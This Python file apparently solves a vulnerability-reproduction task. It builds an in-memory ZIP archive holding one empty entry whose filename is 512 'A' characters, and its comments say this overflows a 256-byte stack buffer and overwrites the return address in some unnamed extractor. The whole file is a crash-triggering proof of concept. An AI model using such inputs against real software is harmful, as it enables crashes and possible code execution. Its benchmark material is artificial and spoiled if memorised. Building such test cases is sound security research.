import io
import zipfile

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Create an in-memory buffer to hold the ZIP file
        buffer = io.BytesIO()
        
        # Initialize the ZipFile object with ZIP_STORED (no compression) 
        # to keep the structure simple and size minimal.
        with zipfile.ZipFile(buffer, 'w', zipfile.ZIP_STORED) as zf:
            # The vulnerability is a stack buffer overflow in a 256-byte buffer
            # triggered by copying a filename extracted from the archive.
            # We generate a filename of 512 bytes ('A's) which exceeds the 
            # 256-byte buffer, overwriting the stack (return address, etc.).
            malicious_filename = "A" * 512
            
            # Write a file entry into the ZIP archive with the overflowing filename.
            # The file content is empty as the crash occurs during filename handling.
            zf.writestr(malicious_filename, b"")
            
        # Return the raw bytes of the constructed ZIP file
        return buffer.getvalue()
